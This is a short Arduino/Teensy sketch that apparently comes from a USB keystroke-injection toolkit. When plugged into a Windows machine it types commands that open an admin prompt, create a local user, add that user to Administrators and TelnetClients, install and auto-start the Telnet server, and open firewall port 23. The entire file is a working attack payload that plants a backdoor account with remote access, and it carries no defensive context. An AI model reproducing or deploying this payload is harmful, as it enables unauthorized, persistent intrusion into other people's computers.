#define BOARDTYPE
#ifdef TEENSY2
    #include<usb_private.h>
#endif

# define PAYLOAD_USER_ADD "net user INPUT0 INPUT1 /add"
# define PAYLOAD_GROUP_ADD "net localgroup Administrators INPUT0 /add"
# define PAYLOAD_TELNETGROUP_ADD "net localgroup TelnetClients INPUT0 /add"

void setup(){

 delay(3000);
  wait_for_drivers(2000);

  minimise_windows();
  delay(500);
  while(!cmd_admin(3,500))
  {
  reset_windows_desktop(2000);
  }

add_user();
Keyboard.println("pkgmgr /iu:\"TelnetServer\"");
delay(10000);
Keyboard.println("reg add \"HKLM\\System\\CurrentControlSet\\Services\\TlntSvr\" /v Start /t REG_DWORD /d 2 /f");
delay(2000);
Keyboard.println("sc config TlntSvr start= auto");
delay(2000);
Keyboard.println("sc start TlntSvr");
delay(2000);
Keyboard.println("netsh firewall set portopening protocol = tcp port = 23 mode = enable");
delay(3000);
Keyboard.println("exit");
}

void loop(){
}

void add_user(){
delay(2000);
Keyboard.println(PAYLOAD_USER_ADD);
delay(2000);
Keyboard.println(PAYLOAD_GROUP_ADD);
delay(1000);
Keyboard.println(PAYLOAD_TELNETGROUP_ADD);
delay(1000);
}

DEFS